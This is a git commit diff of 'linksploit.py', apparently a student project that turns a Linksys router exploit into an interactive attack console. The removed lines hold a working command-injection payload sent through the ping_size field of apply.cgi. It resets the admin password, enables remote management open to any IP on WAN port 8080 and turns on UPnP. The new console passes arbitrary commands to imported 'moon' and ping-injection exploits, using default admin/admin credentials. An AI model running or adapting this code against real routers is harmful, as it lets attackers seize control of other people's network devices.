9ffb669b03b0b3da20124a0a46b5e73754f4190a
quackers2 <dc2@andrew.cmu.edu>
2023-11-08 01:01:42 -0500

    console done

--- linksploit.py
+++ linksploit.py
@@ -1,33 +1,82 @@
-import requests
+from exploits import command_line_injection
+from exploits import moon_exploit
 
-# target IP address - default for LinkSys
-target = "192.168.1.1"
-port = 80
+settings = {
+  # default ip and port for Linksys, can be changed using set command
+  "target": "192.168.1.1",
+  "port": "80",
 
-# username and password are not validated
-username = "admin"
-password = "admin"
+  # username and password to use for command line injections 
+  "username": "admin",
+  "password": "admin",
 
-cmd = "Management&change_action=&action=Apply&PasswdModify=1&http_enable=1&https_enable=0&ctm404_enable=&remote_mgt_https=0&wait_time=4&need_reboot=0&http_passwd=hello&http_passwdConfirm=hello&_http_enable=1&web_wl_filter=0&remote_management=1&_remote_mgt_https=1&remote_upgrade=0&remote_ip_any=1&http_wanport=8080&nf_alg_sip=0&upnp_enable=1&upnp_config=1&upnp_internet_dis=0"
+  # default settings for http requests
+  "timeout": 10.0,
+  "verify": False,
+  "allow_redirects" : False,
 
-data = {
-    "submit_button": "Diagnostics",
-    "change_action": "gozila_cgi",
-    "submit_type": "start_ping",
-    "action": "",
-    "commit": "0",
-    "ping_ip": "127.0.0.1",
-    "ping_size": "&" + cmd, # Inject CMD through ping size since ping size not validated  
-    "ping_times": "5",
-    "traceroute_ip": "127.0.0.1"
+  # default settings for linksploit
+  "exploit" : "moon"
 }
 
-timeout = 30.0
-verify = False
-allow_redirects = False
+def print_settings():
+  print()
+  for key in settings:
+    print(f"{key}: {settings[key]}")
+  print()
 
-url = f"http://{target}:{port}/apply.cgi"
+def change_settings(cmd : str):
+  if cmd.count(" ") > 2:
+    print("Too many arguments. Expected 'set [setting] [value]")
+    return
+  elif cmd.count(" ") < 2:
+    print("Too few arguments. Expected 'set [setting] [value]")
+    return
 
-response = requests.post(url, data = data, auth = (username, password), timeout = timeout, verify = verify, allow_redirects = allow_redirects)
+  _, setting, value = cmd.split(" ")
 
-print(response.text)
+  if setting not in settings:
+    print("Setting does not exist")
+    return
+  
+  try:
+    if setting == "exploit" and value not in ["moon", "ping"]:
+      print(f"Setting for exploit must be either 'moon' or 'ping'")
+      return
+    
+    if setting == "verify" or setting == "allow_redirects":
+      if value.lower() == "true":
+        settings[setting] = True
+      elif value.lower() == "false":
+        settings[setting] = False
+      else:
+        print(f"Invalid setting for {setting}")
+        return
+
+    else:
+      settings[setting] = type(settings[setting])(value) # need to preserve the type of the setting
+
+    print(f"{setting} is now set to {settings[setting]}")
+  except:
+    print(f"Invalid setting for {setting}")
+
+
+
+def main():
+  while(1):
+    cmd = input(">> ")
+    exploit = settings["exploit"]
+
+    if cmd == "exit":
+      print("Goodbye!")
+      return
+    elif cmd.startswith("set "):
+      change_settings(cmd)
+    elif cmd == "settings":
+      print_settings()
+    elif exploit == "moon":
+      moon_exploit(settings = settings, cmd = cmd)
+    else:
+      command_line_injection(settings = settings, cmd = cmd)
+
+main()
